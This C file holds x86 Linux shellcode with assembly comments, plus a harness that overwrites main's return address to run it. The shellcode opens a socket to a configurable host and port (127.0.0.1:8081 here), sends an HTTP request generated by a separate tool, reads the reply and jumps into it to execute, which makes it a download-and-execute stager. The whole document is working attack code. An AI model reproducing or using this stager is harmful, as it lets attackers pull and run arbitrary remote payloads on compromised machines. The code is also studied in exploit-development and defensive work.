char shellcode[] = 

	"\x6a\x66"              // push $0x66 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x6a\x01"              // push $0x1 
	"\x5b"                  // pop %ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x6a\x02"              // push $0x2 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x5b"                  // pop %ebx 
	"\x5d"                  // pop %ebp 

				//
	"\xbe\x80\xff\xff\xfe"  // mov $0xfeffff80,%esi 
				// (0x0xfeffff80 = ~127.0.0.1)
				//

				//
	"\x66\xbd\x91\x1f"      // mov $0x1f91,%bp 
				// (0x1f91 = 8081/tcp)
				//

	//
	// "\x66\xbd\xaf\xff"	// mov $0xffaf, %bp
	//			// (0xafff = ~0080/tcp)
	// "\x66\xf7\xd5"       // not %bp
	//

	"\xf7\xd6"              // not %esi 
	"\x56"                  // push %esi 
	"\x0f\xcd"              // bswap %ebp 
	"\x09\xdd"              // or %ebx,%ebp 
	"\x55"                  // push %ebp 
	"\x43"                  // inc %ebx 
	"\x6a\x10"              // push $0x10 
	"\x51"                  // push %ecx 
	"\x50"                  // push %eax 
	"\xb0\x66"              // mov $0x66,%al 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 

	// <paste here the code, that gen_httpreq.c outputs>

	"\x89\xe1"              // mov %esp,%ecx 
	"\xb0\x04"              // mov $0x4,%al 
	"\xcd\x80"              // int $0x80 

	// <_recv_http_request>:

	"\xb0\x03"              // mov $0x3,%al 
	"\x6a\x01"              // push $0x1 
	"\x5a"                  // pop %edx 
	"\xcd\x80"              // int $0x80 
	"\x41"                  // inc %ecx 
	"\x85\xc0"              // test %eax,%eax 
	"\x75\xf4"              // jne <_recv_http_request> 
	"\x83\xe9\x06"          // sub $0x6,%ecx 
	"\xff\xe1";             // jmp *%ecx 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}
